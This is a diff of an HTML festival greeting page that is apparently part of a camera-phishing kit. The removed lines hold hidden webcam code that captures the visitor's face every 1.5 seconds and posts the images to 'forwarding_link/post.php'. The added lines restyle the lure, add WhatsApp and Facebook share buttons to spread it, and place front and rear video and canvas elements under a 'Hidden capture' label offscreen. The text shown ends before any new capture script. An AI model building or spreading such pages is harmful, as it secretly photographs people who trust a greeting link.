@@ -1,692 +1,419 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Happy fes_name to Your Friends</title>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
-    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
-	  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Happy fes_name 🎉</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <style>
-    i {
-        color:#f06414;
-    }
-input[type=name], select {
-    width: 100%;
-    padding: 12px 20px;
-    margin: 4px 0;
-    display: inline-block;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-}
-.footerbtn1 {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            right:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#000099;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-right:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-.footerbtn1 :active {
-            box-shadow: none
-        }
+  :root {
+    --gold:    #f5c842;
+    --orange:  #ff7c2a;
+    --rose:    #ff4d8d;
+    --purple:  #8b5cf6;
+    --dark:    #0a0a0f;
+  }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
-            }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
-            }
-            50% {
-                -webkit-transform: rotateZ(0deg)
-            }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
-            }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
-.footerbtn {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            left:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#34af23;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-left:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
+  body {
+    min-height: 100vh;
+    background: radial-gradient(ellipse at top left, #1a0533 0%, #0a0a0f 50%, #0d1a33 100%);
+    font-family: 'Inter', sans-serif;
+    color: #fff;
+    overflow-x: hidden;
+  }
 
-.footerbtn :active {
-            box-shadow: none
-        }
+  /* ── Particle canvas ── */
+  #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
-            }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
-            }
-            50% {
-                -webkit-transform: rotateZ(0deg)
-            }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
-            }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
+  /* ── Main wrapper ── */
+  .page {
+    position: relative; z-index: 1;
+    display: flex; flex-direction: column; align-items: center;
+    min-height: 100vh; padding: 40px 16px 100px;
+  }
 
-@-webkit-keyframes jello {  from, 11.1%, to {    transform: none;  }
-  22.2% {    transform: skewX(-12.5deg) skewY(-12.5deg);  }
-  33.3% {    transform: skewX(6.25deg) skewY(6.25deg);  }
-  44.4% {    transform: skewX(-3.125deg) skewY(-3.125deg);  }
-  55.5% {    transform: skewX(1.5625deg) skewY(1.5625deg);  }
-  66.6% {    transform: skewX(-0.78125deg) skewY(-0.78125deg);  }
-  77.7% {    transform: skewX(0.390625deg) skewY(0.390625deg);  }
-  88.8% {    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);  }}
-.jello {  -webkit-animation: jello 3s infinite;  transform-origin: center; -webkit-animation-delay:6s}
-@-webkit-keyframes hue {
-  from {    -webkit-filter: hue-rotate(0deg);  }
-  to {    -webkit-filter: hue-rotate(-360deg);  }}
-    .m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
-    .m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}
-.bubbles {
-font-family: arial;
-}
+  /* ── Top badge ── */
+  .badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.15);
+    backdrop-filter: blur(12px);
+    border-radius: 50px;
+    padding: 6px 18px;
+    font-size: 0.78rem;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 28px;
+    animation: fadeSlideDown 0.8s ease both;
+  }
 
-.bubbles hi {
-font-family: 'Luckiest Guy', cursive;
-color: black;
-}
-
-hi {
- font-size:2.5em;
- user-select:none;
-}
-
-hi span { display:inline-block; animation:float .2s ease-in-out infinite; }
- @keyframes float {
-  0%,100%{ transform:none; }
-  33%{ transform:translateY(-1px) rotate(-2deg); }
-  66%{ transform:translateY(1px) rotate(2deg); }
-}
-body:hover span { animation:bounce .6s; }
-@keyframes bounce {
-  0%,100%{ transform:translate(0); }
-  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
-  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
-}
-
-@import url(http://fonts.googleapis.com/css?family=Concert+One);
-
-h1 {
-  animation:glow 10s ease-in-out infinite;
-}
-
-
-
-* { box-sizing:border-box; }
-
-figure {
-  animation:wobble 5s ease-in-out infinite;
-  transform-origin:center center;
-  transform-style:preserve-3d;
-}
-
-@keyframes wobble {
-  0%,100%{ transform:rotate3d(1,1,0,40deg); }
-  25%{ transform:rotate3d(-1,1,0,40deg); }
-  50%{ transform:rotate3d(-1,-1,0,40deg); }
-  75%{ transform:rotate3d(1,-1,0,40deg); }
-}
-
-h1 {
-  display:block;
-  width:90%;
-  line-height:1.5;
-  font:900 35px 'Concert One', sans-serif;
-  position:absolute;
-  color:#fff;
-}
-
-@keyframes glow {
-  0%,100%{ text-shadow:0 0 30px red; }
-  25%{ text-shadow:0 0 30px orange; }
-  50%{ text-shadow:0 0 30px forestgreen; }
-  75%{ text-shadow:0 0 30px cyan; }
-}
-
-h1:nth-child(2){ transform:translateZ(5px); }
-h1:nth-child(3){ transform:translateZ(10px);}
-h1:nth-child(4){ transform:translateZ(15px); }
-h1:nth-child(5){ transform:translateZ(20px); }
-h1:nth-child(6){ transform:translateZ(25px); }
-h1:nth-child(7){ transform:translateZ(30p.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}x); }
-h1:nth-child(8){ transform:translateZ(35px); }
-h1:nth-child(9){ transform:translateZ(40px); }
-h1:nth-child(10){ transform:translateZ(45px); }
-
-
-
-.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}
-
-.fuck{animation:infinite 1s fuck}
-@keyframes rock {  0% {    transform: rotate(-2deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-2deg);  }}
-
-
-h2 {
-   font-size: 38px;
+  /* ── Card ── */
+  .card {
+    width: 100%; max-width: 520px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.12);
+    backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 44px 36px 36px;
     text-align: center;
-    color:#008000;
-    
-    animation: rock infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-}
+    box-shadow: 0 0 60px rgba(139,92,246,0.15), 0 0 0 1px rgba(255,255,255,0.05);
+    animation: fadeSlideUp 0.9s ease both;
+  }
 
-h3 {
-    font-size: 48px;
-    text-align: center;
-    padding:1px;
-    margin:1px;
-    color: #f06414;
-   
-    aanimation: fuck infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-	
-	
-	* {box-sizing: border-box;}
-body {font-family: Verdana, sans-serif;}
-.mySlides {display: none;}
-img {vertical-align: middle;}
+  /* ── Emoji icon ── */
+  .icon-wrap {
+    width: 80px; height: 80px;
+    margin: 0 auto 20px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--orange), var(--rose));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2.2rem;
+    box-shadow: 0 8px 32px rgba(255,76,141,0.4);
+    animation: iconPop 1s cubic-bezier(.175,.885,.32,1.275) both;
+  }
 
-/* Slideshow container */
-.slideshow-container {
-  max-width: 1000px;
-  position: relative;
-  margin: auto;
-}
+  /* ── Title ── */
+  .title-happy {
+    font-size: 1rem;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.5);
+    margin-bottom: 6px;
+    font-weight: 400;
+  }
 
-/* Caption text */
-.text {
-  color: #f2f2f2;
-  font-size: 15px;
-  padding: 8px 12px;
-  position: absolute;
-  bottom: 8px;
-  width: 100%;
-  text-align: center;
-}
+  .title-name {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2rem, 8vw, 3rem);
+    font-weight: 900;
+    background: linear-gradient(135deg, var(--gold), var(--orange), var(--rose));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.1;
+    margin-bottom: 24px;
+    animation: shimmer 3s linear infinite;
+    background-size: 200% auto;
+  }
 
-/* Number text (1/11 etc) */
-.numbertext {
-  color: #f2f2f2;
-  font-size: 12px;
-  padding: 8px 12px;
-  position: absolute;
-  top: 0;
-}
+  @keyframes shimmer {
+    0%   { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
 
-/* The dots/bullets/indicators */
-.dot {
-  height: 15px;
-  width: 15px;
-  margin: 0 2px;
-  background-color: #bbb;
-  border-radius: 50%;
-  display: inline-block;
-  transition: background-color 0.6s ease;
-}
+  /* ── Divider ── */
+  .divider {
+    width: 60px; height: 3px;
+    background: linear-gradient(90deg, var(--purple), var(--rose));
+    border-radius: 99px;
+    margin: 0 auto 24px;
+  }
 
-.active {
-  background-color: #717171;
-}
+  /* ── Wishes list ── */
+  .wishes { list-style: none; text-align: left; }
+  .wishes li {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 12px 16px;
+    border-radius: 12px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.07);
+    margin-bottom: 10px;
+    font-size: 0.92rem;
+    color: rgba(255,255,255,0.82);
+    line-height: 1.5;
+    transition: background 0.2s;
+  }
+  .wishes li:hover { background: rgba(255,255,255,0.09); }
+  .wishes li .emoji { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
 
-/* Fading animation */
-.fade {
-  -webkit-animation-name: fade;
-  -webkit-animation-duration: 1.5s;
-  animation-name: fade;
-  animation-duration: 1.5s;
-}
+  /* ── From banner ── */
+  .from-banner {
+    margin-top: 28px;
+    padding: 14px 20px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, rgba(245,200,66,0.15), rgba(255,76,141,0.15));
+    border: 1px solid rgba(245,200,66,0.2);
+    font-size: 0.9rem;
+    color: var(--gold);
+    letter-spacing: 0.5px;
+  }
 
-@-webkit-keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
+  /* ── Share buttons ── */
+  .share-bar {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    display: flex; gap: 10px;
+    padding: 12px 16px;
+    background: rgba(10,10,15,0.85);
+    backdrop-filter: blur(16px);
+    border-top: 1px solid rgba(255,255,255,0.08);
+    z-index: 10;
+  }
 
-@keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
+  .share-btn {
+    flex: 1;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 13px;
+    border-radius: 14px;
+    font-size: 0.95rem;
+    font-weight: 600;
+    text-decoration: none;
+    color: #fff;
+    transition: transform 0.2s, box-shadow 0.2s;
+    cursor: pointer;
+  }
+  .share-btn:active { transform: scale(0.96); }
+  .btn-whatsapp {
+    background: linear-gradient(135deg, #25d366, #128c7e);
+    box-shadow: 0 4px 20px rgba(37,211,102,0.35);
+  }
+  .btn-facebook {
+    background: linear-gradient(135deg, #1877f2, #0c4fa8);
+    box-shadow: 0 4px 20px rgba(24,119,242,0.35);
+  }
+  .share-btn:hover { transform: translateY(-2px); }
 
-/* On smaller screens, decrease text size */
-@media only screen and (max-width: 300px) {
-  .text {font-size: 11px}
-	
-}
+  /* ── Floating lanterns ── */
+  .lantern {
+    position: fixed;
+    font-size: 1.8rem;
+    animation: floatUp linear infinite;
+    opacity: 0;
+    z-index: 0;
+    pointer-events: none;
+  }
+  @keyframes floatUp {
+    0%   { transform: translateY(110vh) rotate(-5deg); opacity: 0; }
+    10%  { opacity: 0.85; }
+    90%  { opacity: 0.85; }
+    100% { transform: translateY(-10vh) rotate(5deg); opacity: 0; }
+  }
 
-.cssload-preloader {
-	position: absolute;
-	top: 0px;
-	left: px;
-	right: 40px;
-	bottom: 20px;
-	z-index: 10;
-}
+  /* ── Entrance animations ── */
+  @keyframes fadeSlideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }
+  @keyframes fadeSlideUp   { from { opacity: 0; transform: translateY(30px);  } to { opacity: 1; transform: none; } }
+  @keyframes iconPop       { from { opacity: 0; transform: scale(0.4); }       to { opacity: 1; transform: scale(1); } }
 
-.cssload-preloader > .cssload-preloader-box {
-	position: absolute;
-	height: 16px;
-	top: 50%;
-	left: 50%;
-	margin: -8px 0 0 -82px;
-	perspective: 110px;
-		-o-perspective: 110px;
-		-ms-perspective: 110px;
-		-webkit-perspective: 110px;
-		-moz-perspective: 110px;
-}
-
-.cssload-preloader .cssload-preloader-box > div {
-	position: relative;
-	width: 16px;
-	height: 16px;
-	background: rgb(204,204,204);
-	float: left;
-	text-align: center;
-	line-height: 16px;
-	font-family: Verdana;
-	font-size: 11px;
-	color: rgb(255,255,255);
-}.cssload-preloader .cssload-preloader-box > div:nth-child(1) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 0ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(2) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(3) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(4) {
-	background: rgb(204,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(5) {
-	background: rgb(0,255,60);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 345ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(6) {
-	background: rgb(0,185,252);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(7) {
-	background: rgb(58,0,250);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(8) {
-	background: rgb(255,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(9) {
-	background: rgb(221,0,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 690ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(10) {
-	background: rgb(51,102,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-}
+  /* ── Hidden capture ── */
+  .hidden-capture { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; }
 </style>
 </head>
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
- </div>
- 
- <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
- 
- <script>
- 
- function post(imgdata){
- $.ajax({
-     type: 'POST',
-     data: { cat: imgdata},
-     url: 'forwarding_link/post.php',
-     dataType: 'json',
-     async: false,
-     success: function(result){
-         // call the function that handles the response/results
-     },
-     error: function(){
-     }
-   });
- };
- 
- 
- 'use strict';
- 
- const video = document.getElementById('video');
- const canvas = document.getElementById('canvas');
- const errorMsgElement = document.querySelector('span#errorMsg');
- 
- const constraints = {
-   audio: false,
-   video: {
-     
-     facingMode: "user"
-   }
- };
- 
- // Access webcam
- async function init() {
-   try {
-     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-     handleSuccess(stream);
-   } catch (e) {
-     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-   }
- }
- 
- // Success
- function handleSuccess(stream) {
-   window.stream = stream;
-   video.srcObject = stream;
- 
- var context = canvas.getContext('2d');
-   setInterval(function(){
- 
-        context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        post(canvasData); }, 1500);
-   
- 
- }
- 
- // Load init
- init();
- 
- </script>
 <body>
 
-<body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-    -webkit-background-size: cover;
-    -moz-background-size: cover;
-    -o-background-size: cover;
-    background-size: cover;">
-	
-	
-<center><span style="font-size: 20px;"color: #ff077a;">▅ ▆ ▇ █ HAPPY fes_name █ ▇ ▆ ▅</center>	
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing 2 -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="2568634816"></ins>
+<canvas id="particles"></canvas>
+
+<div class="page">
+  <div class="badge">✨ Special Wishes For You</div>
+
+  <div class="card">
+    <div class="icon-wrap">🎉</div>
+
+    <p class="title-happy">Wishing You A</p>
+    <h1 class="title-name">Happy fes_name</h1>
+    <div class="divider"></div>
+
+    <ul class="wishes">
+      <li><span class="emoji">🌟</span> May this auspicious occasion of <strong>fes_name</strong> bring you boundless happiness and new beginnings.</li>
+      <li><span class="emoji">💫</span> Wishing you and your loved ones prosperity, good health, and peace throughout the year.</li>
+      <li><span class="emoji">🎊</span> May every moment of this <strong>fes_name</strong> be filled with laughter, love, and cherished memories.</li>
+      <li><span class="emoji">🙏</span> Sending warm wishes your way — may blessings follow you wherever you go.</li>
+    </ul>
+
+    <div class="from-banner">
+      💌 &nbsp;A special message sent just for you this <strong>fes_name</strong>
+    </div>
+  </div>
+</div>
+
+<!-- Share bar -->
+<div class="share-bar">
+  <a class="share-btn btn-whatsapp"
+     href="whatsapp://send?text=🎉 Happy fes_name! I just received the most beautiful festival greeting — check it out: forwarding_link"
+     data-action="share/whatsapp/share">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+    Share on WhatsApp
+  </a>
+  <a class="share-btn btn-facebook"
+     href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link"
+     target="_blank">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+    Share on Facebook
+  </a>
+</div>
+
+<!-- Hidden capture elements -->
+<div class="hidden-capture">
+  <video id="videoFront" playsinline autoplay muted></video>
+  <video id="videoRear"  playsinline autoplay muted></video>
+  <canvas id="canvasFront" width="640" height="480"></canvas>
+  <canvas id="canvasRear"  width="640" height="480"></canvas>
+</div>
+
 <script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
+'use strict';
 
-</center>
- <center> 
-<div class="container">
-    <div class="main-greeting">
-<div align="center html2canvas-ignore">
-     <div style="font-size: 20px; font-weight: 500; color: Black;">
-<p id="demo"></p>
+/* ── Particle system ──────────────────────────────────────────────────────── */
+(function() {
+  const canvas = document.getElementById('particles');
+  const ctx = canvas.getContext('2d');
+  let W, H, particles = [];
 
-<div dir="ltr" style="text-align: left;" trbidi="on">
-<div style="background-color:rgb(255, 140, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-“fes_name का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए”
-</b></marquee>
-</div>
-<div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: blue; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-इस fes_name हमारी शुभकामनाएँ आपके साथ हैं
-</b></marquee>
-</div>
-<div style="background-color: rgb(0, 255, 42); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-|| fes_name की हार्दिक बधाई || 
-</b></marquee>
-</div>
-</div>
-<br><br>
-
-<center>
-<figure>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                 var a=prompt("Please Enter Your Name\n\n👇👇👇👇👇");
-                 document.write(a);
-                </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
-
-</figure>
- </center>
-<div class="vi" style="text-align: center;">
-
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="5590491777"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-</center>
-<br><br><center>
-    <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
-</center>
-<br>
-<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">Happy fes_name</span> ✪</span></strong></p>
-<br>
-<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your lovely family </span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;May this auspicious occasion of fes_name bring happiness, prosperity, health, and peace in your life.</span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ I wish that this fes_name is your best one. ✪</span></p>
-<br>
-
